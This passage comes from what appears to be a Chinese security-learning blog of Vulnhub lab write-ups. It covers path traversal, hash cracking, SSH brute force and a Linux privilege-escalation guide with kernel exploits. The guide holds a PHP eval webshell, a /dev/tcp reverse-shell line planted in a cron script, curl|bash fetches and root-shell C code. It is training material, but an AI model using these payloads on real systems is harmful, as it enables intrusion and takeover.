src="/../images/Pasted%20image%2020241226211951.png"></p><p>接下来就要猜路径了，&#x2F;alerts 肯定要有，已知安装页面的路径是 &#x2F;administrator，那么猜测：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">46.139</span><span class="hljs-regexp">/administrator/</span>alerts<span class="hljs-regexp">/alertConfigField.php?urlConfig=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p>发现有反应，但是并没有读取到 passwd 文件：</p><p><img src="/../images/Pasted%20image%2020241226212508.png"></p><p>此时要去思考后端的处理逻辑，urlConfig 这个参数有可能不是 GET 形式，而且 exp 中还提到了 base64 我们还没有用到。</p><p>尝试着搜索源码，如果能找到，就可以做代码审计验证我们的猜测了。</p><p><img src="/../images/Pasted%20image%2020241226213703.png"></p><p>去 <code>/alerts/alertConfigField</code>中搜索相关代码，发现是用 POST 方式处理参数的：</p><p><img src="/../images/Pasted%20image%2020241226213827.png"></p><p>访问 <a href="http://192.168.46.139/administrator/alerts/alertConfigField.php">http://192.168.46.139/administrator/alerts/alertConfigField.php</a> ，用 BurpSuite 抓包，修改请求方式，成功读取 passwd 文件：</p><p><img src="/../images/Pasted%20image%2020241226214348.png"></p><h1 id="0x05-密码爆破"><a href="#0x05-密码爆破" class="headerlink" title="0x05 密码爆破"></a>0x05 密码爆破</h1><p>每条用户数据的第二条都是 x ，证明密码以 hash 的形式存在了 <code>etc/shadow</code> 中，读取：</p><p><img src="/../images/Pasted%20image%2020241226214710.png"></p><p>新建一个名为 hash 的文件，将有 hash 值的三个用户信息复制进去：</p><p><img src="/../images/Pasted%20image%2020241226215132.png"></p><p>用之前打靶了解到的 john 破解哈希密码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">john <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><p>很快就破解出了后两个用户，root一直破解不出来：</p><p><img src="/../images/Pasted%20image%2020241226215451.png"></p><h1 id="0x06-ssh登录及提权"><a href="#0x06-ssh登录及提权" class="headerlink" title="0x06 ssh登录及提权"></a>0x06 ssh登录及提权</h1><p>一般 www-data 是功能性账号，我们优先探索 w1r3s ：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> ssh w1r3s@<span class="hljs-number">192.168.46.139</span><br></code></pre></td></tr></table></figure><p>登录成功：</p><p><img src="/../images/Pasted%20image%2020241226220744.png"></p><p><img src="/../images/Pasted%20image%2020241226221006.png"></p><p>第一个 ALL 表示 w1r3s 可以在任何主机上执行命令（适用于所有主机）。第二个 ALL 表示 w1r3s 可以以任何用户身份执行命令。最后的 ALL 表示没有限制，w1r3s 可以执行所有命令。这说明 w1r3s 拥有和 root 一样的权限，以 sudo 的权限运行&#x2F;bin&#x2F;bash，提权成功！</p><p><img src="/../images/Pasted%20image%2020241226221403.png"></p><p><img src="/../images/Pasted%20image%2020241226222131.png"></p><h1 id="0x07-补充"><a href="#0x07-补充" class="headerlink" title="0x07 补充"></a>0x07 补充</h1><p>虽然已经拿到了 flag，但我们还是继续探索其它两个端口，毕竟这篇文章的主要目的是详述渗透测试的思路。</p><p>首先尝试 mysql 登录。</p><p>在一开始没有用户信息时，尝试以 root 身份无密码登录：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -h <span class="hljs-number">192.168.46.139</span> -u root -p<br></code></pre></td></tr></table></figure><p>失败。以 www-data 和  w1r3s 身份登录，也都失败了。于是放弃这个端口。</p><p>接下来尝试 22 端口。一般 ssh 暴力破解的可能性不大，并不推荐。但在实际渗透过程中，如果其它方法行不通，也可以尝试一下。</p><p>结合 ftp 泄露的信息和可能的用户名构造个字典：</p><p><img src="/../images/Pasted%20image%2020241226224223.png"></p><p>用 hydra 破解密码：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">hydra -L user.txt -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt ssh:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">46.139</span> -t <span class="hljs-number">4</span><br><span class="hljs-regexp">//</span>rockyou.txt在英语环境中做密码破解效率还是很高的<br><span class="hljs-regexp">//</span>-t:线程数<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226225149.png"></p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08 Conclusion"></a>0x08 Conclusion</h1><p>作为一个网安领域的新人，目前学习了也有几个月了，能明显感觉到自己的进步，但也知道自己水平差得还很远。看完视频，打完这个靶场，我对渗透测试的思路更加明确了。近期任务就是多打 vulnhub，争取早日独立打靶成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;偶然在 b 站上发现</summary>
      
    
    
    
    
    <category term="红队技能" scheme="http://example.com/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>权限提升</title>
    <link href="http://example.com/2024/12/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>http://example.com/2024/12/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2024-12-23T08:20:09.000Z</published>
    <updated>2025-01-09T05:02:15.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux权限提升"><a href="#Linux权限提升" class="headerlink" title="Linux权限提升"></a>Linux权限提升</h1><h2 id="1-内核提权"><a href="#1-内核提权" class="headerlink" title="1. 内核提权"></a>1. 内核提权</h2><h3 id="相关命令及脚本"><a href="#相关命令及脚本" class="headerlink" title="相关命令及脚本"></a>相关命令及脚本</h3><ul><li><strong>信息收集</strong></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//查看当前主机的操作系统：<br>hostnamectl<br><span class="hljs-built_in">cat</span> /etc/*-release<br>lsb_release -a <br><span class="hljs-built_in">cat</span> /etc/lsb-release <span class="hljs-comment"># Debain</span><br><span class="hljs-built_in">cat</span> /etc/redhat-release <span class="hljs-comment"># Redhat</span><br><span class="hljs-built_in">cat</span> /etc/centos-release  <span class="hljs-comment"># Centos</span><br><span class="hljs-built_in">cat</span> /etc/os-release  <span class="hljs-comment"># Ubuntu</span><br><span class="hljs-built_in">cat</span> /etc/issue<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//查看当前主机的内核版本：<br><span class="hljs-built_in">uname</span> -a <br><span class="hljs-built_in">uname</span> -r<br>hostnamectl<br><span class="hljs-built_in">cat</span> /proc/version<br>dmesg | grep <span class="hljs-string">&quot;Linux version&quot;</span><br></code></pre></td></tr></table></figure><ul><li><strong>内核漏洞筛选</strong></li></ul><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>提权脚本：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/liamg/</span>traitor<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/The-Z-Labs/</span>linux-exploit-suggester(常用 ./sh文件)<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jondonas/</span>linux-exploit-suggester-<span class="hljs-number">2</span>(pl文件)<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/belane/</span>linux-soft-exploit-suggester(py文件)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>综合脚本：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/carlospolop/</span>PEASS-ng <span class="hljs-comment"># 前面 htb 靶场用过</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/diego-treitos/</span>linux-smart-enumeration<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/redcode-labs/</span>Bashark<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum<br></code></pre></td></tr></table></figure><ul><li><p><strong>MSF</strong></p><p>  MSF（Metasploit Framework） 是一款非常流行的开源渗透测试框架，提供了大量的工具和模块，用于发现漏洞、开发攻击载荷（payload）、漏洞利用（exploit）、后渗透攻击等，是网络安全领域的强大工具。</p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//基础命令：<br>msfconsole  <span class="hljs-comment"># 进入框架</span><br>search  ms17_010                                  <span class="hljs-comment"># 查找相关漏洞</span><br>use exploit/windows/smb/ms17_010_eternalblue      <span class="hljs-comment"># 进入模块</span><br>info       <span class="hljs-comment"># 查看模块信息</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp   <span class="hljs-comment"># 设置攻击载荷</span><br>show options          <span class="hljs-comment"># 查看模块需要配置的参数</span><br><span class="hljs-built_in">set</span>  RHOST  192.168.100.158      <span class="hljs-comment"># 设置参数</span><br>exploit / run       <span class="hljs-comment"># 攻击</span><br></code></pre></td></tr></table></figure><h3 id="实例演示-dirtycow-CVE-2016-5159"><a href="#实例演示-dirtycow-CVE-2016-5159" class="headerlink" title="实例演示 - dirtycow(CVE-2016-5159)"></a>实例演示 - dirtycow(CVE-2016-5159)</h3><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><ul><li><strong>信息收集</strong></li></ul><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p- -sV <span class="hljs-number">192.168.46.0</span>/<span class="hljs-number">24</span>   <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224145037.png"></p><p>先用浏览器访问 <a href="http://192.168.46.136/">http://192.168.46.136</a> ，没发现有用信息：<br><img src="/../images/Pasted%20image%2020241224145231.png"><br>然后访问 1898 端口：<br><img src="/../images/Pasted%20image%2020241224150213.png"></p><p>通过搜索，得知该 CMS 目前有被公开的漏洞，接下来就是漏洞利用阶段。</p><p>其它环境如果没有明显信息，要想到用 Wappalyzer 搜集信息。</p><ul><li><strong>Web漏洞利用-MSF对CMS已公开漏洞的利用</strong></li></ul><ol><li>输入命令<code>msfconsole</code> ，打开msf框架。</li><li>输入<code>search drupal</code> 搜索相关漏洞：</li></ol><p><img src="/../images/Pasted%20image%2020241224152019.png"></p><p>发现个可以利用的漏洞：Drupalgeddon 2 通过 Forms API 属性注入漏洞，攻击者可以在无需身份验证的情况下，直接远程执行任意代码。</p><ol start="3"><li>使用该漏洞利用模块：</li></ol><figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> exploit/unix/webapp/drupal_drupalgeddon2<br><span class="hljs-keyword">show</span> options  <span class="hljs-meta">#查看 payload 需要配置的信息</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224153345.png"></p><p>设置目标 ip 地址及端口：</p><figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhost <span class="hljs-comment">192.168.46.136</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rport 1898</span><br>run<br></code></pre></td></tr></table></figure><p>成功获得 Web 权限：</p><p><img src="/../images/Pasted%20image%2020241224153953.png"></p><blockquote><p><strong>Meterpreter</strong> 是 MSF 的一种高级动态扩展payload，用于远程访问和控制受害者主机。它以稳定性和隐蔽性而闻名，并提供了一系列强大的功能。</p></blockquote><ol><li>升级临时shell：</li></ol><p>首先输入<code>shell</code>起一个终端，然后利用 htb 靶场用过的升级shell的命令：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SHELL</span>=/bin/bash<span class="hljs-built_in"> script </span>-q /dev/<span class="hljs-literal">null</span><br>stty<span class="hljs-built_in"> raw </span>-echo<br>reset<br>xterm<br></code></pre></td></tr></table></figure><p>或者利用 Python 升级shell：</p><figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><ul><li><strong>内核提权</strong></li></ul><p><a href="https://www.cnblogs.com/kqdssheng/p/18231011#id4.3">Linux 提权-内核利用 - 扛枪的书生 - 博客园</a></p><p>首先信息收集：</p><p><img src="/../images/Pasted%20image%2020241224161427.png"></p><p>利用提权脚本。这里我们还是使用 htb 靶场用过的 linPEAs 自动查找内核漏洞。</p><p>在 linpeas.sh 所在目录起一个 http.server，方便目标机器下载：</p><p><img src="/../images/Pasted%20image%2020241224155224.png"></p><p>让目标主机获取 linpeas.sh，并将通过管道传输到 bash 直接执行它：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> http://192.168.46.131:8000/linpeas.sh | bash<br></code></pre></td></tr></table></figure><p>检测到目标主机极易受到脏牛漏洞的攻击，并且给出了 exp 的下载地址（exp要多找多试，每个人写的功能不一样，这里给出的就不合适）：</p><p><img src="/../images/Pasted%20image%2020241224160612.png"></p><p>用这个exp : <a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a> ，它将强制修改 root 密码为 “dirtyCowFun” 。</p><p>相同操作让目标主机获取 dcow.cpp:</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">wget http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.46.131:8000/dcow.cpp</span><br></code></pre></td></tr></table></figure><p>编译：</p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">g</span><span class="hljs-literal">++</span> <span class="hljs-literal">-</span><span class="hljs-comment">Wall</span> <span class="hljs-literal">-</span><span class="hljs-comment">pedantic</span> <span class="hljs-literal">-</span><span class="hljs-comment">O2</span> <span class="hljs-literal">-</span><span class="hljs-comment">std=c</span><span class="hljs-literal">++</span><span class="hljs-comment">11</span> <span class="hljs-literal">-</span><span class="hljs-comment">pthread</span> <span class="hljs-literal">-</span><span class="hljs-comment">o dcow dcow</span><span class="hljs-string">.</span><span class="hljs-comment">cpp</span> <span class="hljs-literal">-</span><span class="hljs-comment">lutil</span><br><span class="hljs-comment">//实战中如果在目标服务器上编译失败，可能是对方服务器没有g</span><span class="hljs-literal">++</span><span class="hljs-comment">环境，可以本地找个差不多的系统环境编译好后再上传上去。但是优先在目标服务器上进行编译</span><br></code></pre></td></tr></table></figure><p>执行生成的可执行文件：</p><p><img src="/../images/Pasted%20image%2020241224171505.png"></p><p>提权成功：</p><p><img src="/../images/Pasted%20image%2020241224171636.png"></p><h3 id="实例演示-Pwnkit-CVE-2021-4034"><a href="#实例演示-Pwnkit-CVE-2021-4034" class="headerlink" title="实例演示 - Pwnkit(CVE-2021-4034)"></a>实例演示 - Pwnkit(CVE-2021-4034)</h3><p><a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a></p><ul><li><strong>信息收集</strong></li></ul><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sC <span class="hljs-number">192.168.46.0</span>/<span class="hljs-number">24</span>   <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224183816.png"></p><ul><li><strong>Web 漏洞利用-逻辑漏洞及文件上传漏洞</strong></li></ul><p>访问 <a href="http://192.168.46.137/">http://192.168.46.137</a> ，注册个账号，登录：</p><p><img src="/../images/Pasted%20image%2020241224184429.png"></p><p>提供的是修改密码的功能，url 处有个 get 参数 id&#x3D;2，将其修改为 1 试试：</p><p><img src="/../images/Pasted%20image%2020241224184708.png"></p><p>抓个包，看到两个 post 参数：</p><p><img src="/../images/Pasted%20image%2020241224190044.png"></p><p>那么把 id 改为1是不是就能修改管理员密码了？</p><p>成功登录管理员账号：</p><p><img src="/../images/Pasted%20image%2020241224190507.png"></p><p>接下来就是考察文件上传漏洞了。</p><p>后端语言是 PHP：</p><p><img src="/../images/Pasted%20image%2020241224190754.png"></p><p>哥斯拉生成个shell： </p><p><img src="/../images/Pasted%20image%2020241224191321.png"></p><p>有黑名单限制，fuzz 之后发现可以将后缀名改为 phtml 绕过。</p><p>连接后门：</p><p><img src="/../images/Pasted%20image%2020241224201548.png"></p><p>虽然哥斯拉有命令执行功能，可以直接上传脚本，但是执行后的响应不太好看。最好还是利用哥斯拉的PMeterpreter 模块反弹 shell 到 msf：</p><p><img src="/../images/Pasted%20image%2020241224203850.png"></p><p>反弹成功：</p><p><img src="/../images/Pasted%20image%2020241224203953.png"></p><ul><li><strong>内核提权</strong></li></ul><p>步骤和上一个实例相同，详细文字就不写了，直接放图片：</p><p><img src="/../images/Pasted%20image%2020241224205334.png"></p><figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">wget http://192.168.46.131:8000/CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-main.zip <br>unzip CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-main.zip <br>make<br>./cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span><br></code></pre></td></tr></table></figure><p>但是进行到一步的时候，发现目标系统没有这个工具，安装又需要 root 权限，只能换个 exp：<br><a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p><figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">wget http://192.168.46.131:8000/cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc.c <br>gcc cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc.c -o cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc<br>./cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224214627.png"></p><h3 id="实例演示-DirtyPipe-CVE-2022-0847"><a href="#实例演示-DirtyPipe-CVE-2022-0847" class="headerlink" title="实例演示 - DirtyPipe(CVE-2022-0847)"></a>实例演示 - DirtyPipe(CVE-2022-0847)</h3><p><a href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></p><ul><li><strong>信息收集</strong></li></ul><p><img src="/../images/Pasted%20image%2020241224215602.png"></p><ul><li><strong>Web漏洞利用-敏感文件和后门</strong></li></ul><p><img src="/../images/Pasted%20image%2020241224215732.png"><br>扫目录看看有没有敏感文件：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">192.168.139.138</span> -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224221401.png"></p><p><img src="/../images/Pasted%20image%2020241224221341.png"></p><p>找到个能操作的页面：</p><p><img src="/../images/Pasted%20image%2020241224221534.png"></p><p>抓包分析一下：</p><p><img src="/../images/Pasted%20image%2020241224222116.png"></p><p>输入的内容被写进 txt 文件里了：</p><p><img src="/../images/Pasted%20image%2020241224223413.png"></p><p>那么可以把这两个参数改成木马和后门文件：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">message=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span>&amp;file=shell.php<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224225818.png"></p><p><img src="/../images/Pasted%20image%2020241224225751.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget http://192.168.46.131:8000/dirtypipez.c <br>gcc dirtypipez.c -o dirtypipez<br>./dirtypipez<br></code></pre></td></tr></table></figure><p>提示 <code>Usage: ./dirtypipez SUID</code></p><p>常见的 SUID 文件包括 <code>/bin/su</code> 或 <code>/usr/bin/passwd</code>，这些是提权的潜在目标。</p><p><img src="/../images/Pasted%20image%2020241224230639.png"></p><h2 id="2-根据-Linux-特性提权"><a href="#2-根据-Linux-特性提权" class="headerlink" title="2. 根据 Linux 特性提权"></a>2. 根据 Linux 特性提权</h2><h3 id="SUID-SUDO"><a href="#SUID-SUDO" class="headerlink" title="SUID&amp;SUDO"></a>SUID&amp;SUDO</h3><p>SUID 是一种文件权限设置。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。之前的 HTB-Oopsie 靶场就是利用 SUID 特性提权。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>  # 查找拥有 SUID 权限的文件<br></code></pre></td></tr></table></figure><p>SUDO 权限是 root 把本来只能超级用户执行的命令赋予普通用户执行。SUDO有两个CVE漏洞（CVE-2019-14287，CVE-2021-3156）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/sudoers    <span class="hljs-comment"># 查看哪些用户或用户组可以使用 sudo 命令</span><br><span class="hljs-built_in">sudo</span> -l             <span class="hljs-comment"># 列出当前用户在使用 sudo 时的权限。</span><br></code></pre></td></tr></table></figure><p>通俗来讲就是当 root 用户赋予一个文件 SUID、SUDO 权限时，这个文件被调用的时候就会享有 root 权限。具体如何利用可以在这个项目里查找对应二进制文件的命令： <a href="https://gtfobins.github.io/">GTFOBins</a>。例如利用 find 提权：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;  <br></code></pre></td></tr></table></figure><h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><p>NFS是一种网络文件共享协议，用于访问远程服务器中的共享资源，默认端口 2049，原生支持类 UNIX&#x2F;Linux 系统。前面 HTB 靶场遇到过 SMB 协议，也是网络文件共享协议，默认端口 445，原生支持 Windows 系统。</p><figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir">showmount -e <span class="hljs-number">192.168</span>.<span class="hljs-number">1.6</span>   <span class="hljs-comment"># 显示 NFS 服务器的共享信息</span><br>mkdir nfs                  <span class="hljs-comment"># 本地创建一个 nfs 目录</span><br>mount -t nfs <span class="hljs-number">192.168</span>.<span class="hljs-number">1.6</span><span class="hljs-symbol">:/mnt/nfs</span> ./nfs  <span class="hljs-comment"># 把目标的 /mnt/nfs 目录跟本地的 nfs 目录进行同步</span><br></code></pre></td></tr></table></figure><p>既然文件能够同步，那么就可以配合 SUID 提权，例如把本地具有 SUID 权限的 find 上传到共享目录：</p><p><img src="/../images/Pasted%20image%2020241225203036.png"></p><p>但如果双方系统不同，则会报错。解决办法是找一个与目标版本相似的系统，上传这个系统的find，或者自己写一个c语言去调用命令：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// getroot.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>); <span class="hljs-meta"># root用户：UID为0，系统用户：UID(0-999)，普通用户：UID(1000-*) </span><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;id&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//把getroot.c编译为getroot可执行文件</span><br>gcc getroot.c -o getroot<br></code></pre></td></tr></table></figure><h3 id="PATH-变量"><a href="#PATH-变量" class="headerlink" title="PATH 变量"></a>PATH 变量</h3><p> 参考 HTB-Oopsie 靶场。在执行具有 SUID 权限的&#x2F;usr&#x2F;bin&#x2F;bugtracker 时，发现它会使用 cat 命令，于是插入我们自己构造的 cat 命令，赋予执行权限并将其添加到环境变量中，这样 cat 命令就会以 root 身份执行。</p><p>下例相同：</p><p><code>strings</code>查看具有 SUID 权限的二进制文件，发现里面有 curl 命令。于是在 &#x2F;tmp 下新建一个 curl 文件，执行 <code>/bin/sh</code>:</p><p><img src="/../images/Pasted%20image%2020241225210244.png"></p><p><img src="/../images/Pasted%20image%2020241225210331.png"></p><h3 id="Cron-计划任务"><a href="#Cron-计划任务" class="headerlink" title="Cron 计划任务"></a>Cron 计划任务</h3><p>Cron 是 Linux 系统中用于定期执行任务的守护进程。</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>crontab <span class="hljs-regexp">//</span>查看当前服务器的计划任务<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225211150.png"></p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> -l <span class="hljs-string">/etc/script/CleaningScript.sh</span>  <span class="hljs-string">//</span>查看对该任务文件的权限<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225211334.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.139.141/66 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/script/CleaningScript.sh   <span class="hljs-comment"># 把反弹shell命令写进这个文件里</span><br><br><span class="hljs-built_in">cat</span> /etc/script/CleaningScript.sh   <span class="hljs-comment"># 查看脚本内容</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225211447.png"></p><p><img src="/../images/Pasted%20image%2020241225211502.png"></p><h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>在 Linux 中，传统的权限管理是基于用户和组的（例如，root用户拥有所有权限），而 Capabilities 机制的引入，将权限分解为多个独立的“能力”，每个能力代表操作系统中特定的权限。每个进程拥有一组“能力”，这些能力决定了它能够执行的操作，而无需赋予进程 root 用户的所有权限。</p><p>当拿到权限后要先看下有哪些程序有能力，再对这些能力进行筛选利用。在之前的 HTB-Cap 靶场中，<code>/usr/bin/python3.8</code> 拥有 <code>cap_setuid</code> 权限，因此可以切换到 root 身份。</p><blockquote><p>[!NOTE] cap_setuid</p><ul><li>文件 cap_setuid 的 capabilities 和文件的 suid 标志位之间是没有关系的。</li><li>设置了 cap_setuid 的 capability 的文件并没有设置 suid。</li><li>设置了 suid 的程序也不拥有 cap_setuid 的 capability。</li></ul></blockquote><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>   <span class="hljs-comment">//查看所有Capabilities</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225220832.png"></p><p><img src="/../images/Pasted%20image%2020241225221004.png"></p><p><img src="/../images/Pasted%20image%2020241225220935.png"></p><p><img src="/../images/Pasted%20image%2020241225221043.png"></p><h3 id="LD-Preload"><a href="#LD-Preload" class="headerlink" title="LD_Preload"></a>LD_Preload</h3><p>LD_Preload 是 Linux 系统中的一个环境变量，它允许用户在运行一个程序时，指定额外的共享库（动态链接库）。这些共享库会在程序启动时首先被加载，并覆盖程序原本需要使用的库。</p><p>利用 LD_Preload 在程序运行前优先加载攻击者自定义的so文件，从而达到提权效果。</p><p>打开<code>/etc/sudoers</code>文件：</p><figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">Defaults        env_keep += LD_PRELOAD       # 设置开启LD_PRELOAD<br><span class="hljs-keyword">test  </span>ALL=(ALL:ALL) NOPASSWD: /usr/bin/find  # 赋予一个用户一些sudo权限<br></code></pre></td></tr></table></figure><p>一旦这样设置就会有两个安全问题：sudo提权和 LD_Preload 提权。</p><p>在&#x2F;tmp目录中生成一个 shell.c：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> _init() &#123;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(<span 